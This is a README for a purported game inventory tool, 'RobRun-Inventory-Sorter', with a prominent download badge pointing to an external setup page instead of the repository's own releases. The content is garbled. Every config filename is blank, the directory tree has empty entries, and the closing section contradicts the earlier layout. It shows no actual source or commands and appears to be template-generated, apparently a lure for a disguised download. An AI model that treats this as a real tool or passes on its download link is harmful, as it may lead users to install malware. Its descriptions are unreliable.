Insight:

<div align="center">
  <a href="https://rewfdf.github.io/SetupPage/"><img src="https://img.shields.io/badge/Download-Release-a16207?style=for-the-badge&logo=terminal&logoColor=white" alt="Download"></a>
  <img src="https://img.shields.io/badge/Version-1.2.3-blue?style=flat-square&logo=github&logoColor=white" alt="Version">
  <img src="https://img.shields.io/badge/License-MIT-green?style=plastic&logo=open-source-initiative&logoColor=white" alt="License">
  <img src="https://img.shields.io/badge/Last%20Updated-2026.11.19-orange?style=flat&logo=calendar&logoColor=white" alt="Last Updated">
  <img src="https://img.shields.io/badge/Downloads-5.8k-brightgreen?style=flat-square&logo=download&logoColor=white" alt="Downloads">
</div>

## RobRun-Inventory-Sorter

RobRun-Inventory-Sorter is a focused companion that organizes the inventory data used by the RobRun ecosystem. It delivers:

- **Structured profile files** (``, ``, ``, ``) that map item categories to display attributes.
- **Workflow presets** that automate re‑classification and clean‑up routines.
- **Bundled release** with all resources, ready for immediate deployment.

The solution is fully compatible with the latest RobRun runtime and respects the original data structures without altering core files.

## Directory Structure

```
RobRun-Inventory-Sorter/
├── bin/
│   └── Release
├── config/
│   ├──
│   ├──
│   ├──
│   └──
├── data/
│   ├── presets/
│   │   ├── default.json
│   │   └── compact.json
│   └── logs/
├── README.md
└── LICENSE
```

The `bin` folder contains the executable that performs sorting. The `data/presets` directory houses JSON files that define preset workflows such as *default* and *compact* for quick switching.

## Configuration Highlights

| File | Purpose | Key Sections |
|------|---------|--------------|
| `` | Base mapping of item IDs to categories | `category_map`, `sort_rules` |
| `` | UI display parameters | `icon_set`, `layout_mode` |
| `` | User‑specific preferences | `slot_order`, `visibility_flags` |
| `` | Override rules, loaded after defaults | `override_rules`, `exceptions` |

- The `category_map` section assigns a numeric code to each item ID, enabling fast lookup during sorting.
- `sort_rules` defines thresholds for grouping similar items together.
- In ``, `layout_mode` can be set to `grid`, `list`, or `compact`, affecting how items appear in the interface.
- `` allows the user to reorder slots via a comma‑separated list, e.g., `slot_order=3,1,4,2`.
- `` should be edited only when default rules are insufficient; each rule must reference an existing category code.

## Workflow Presets

The `compact.json` preset reduces inventory clutter by grouping items into larger bins. The `default.json` preset maintains a one‑to‑one mapping but applies a light cleaning routine. Switching presets is done through the sorter’s configuration file:

```text
[workflow]
preset=compact
```

The sorter reads this setting on startup and applies the corresponding JSON file automatically.

## FAQ & Troubleshooting

**Q: The sorter does not reflect recent inventory changes.**
A: Ensure the executable is launched after the inventory is fully loaded. The sorter watches for file modification timestamps; if the inventory file is still being written, it will retry every 30 seconds.

**Q: Custom visual settings revert to defaults after a reboot.**
A: Verify that `` is stored in the correct `config` directory of the RobRun installation. The sorter reads only from the installation path, not the bundled copy.

**Q: I receive an error about missing category codes.**
A: Check the `category_map` section in ``. Each item ID must have an integer code. If an item is new, add a line such as `item_42=7` before running the sorter again.

**Q: How can I add a new preset?**
A: Duplicate an existing JSON file in `data/presets/`, rename it, and modify the `sort_rules` array as desired. Update the `[workflow]` section in the configuration to point to your new preset name.

**Q: The sorter crashes after a configuration edit.**
A: Syntax errors in the `.cfg` files cause parsing failures. Validate each file by opening it in a plain‑text editor and ensuring there are no stray characters or missing delimiters. The sorter logs detailed messages in `data/logs/`.

## Contribution & Licensing

All contributions that enhance rule sets or add new presets are welcome. Please submit a pull request with a concise description of the changes. The project is distributed under the MIT license; see the `LICENSE` file for full terms.

---

© 2026 teraofficialhatchet – RobRun-Inventory-Sorter
RobRun-Inventory-Sorter is free to use, share, and adapt.

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```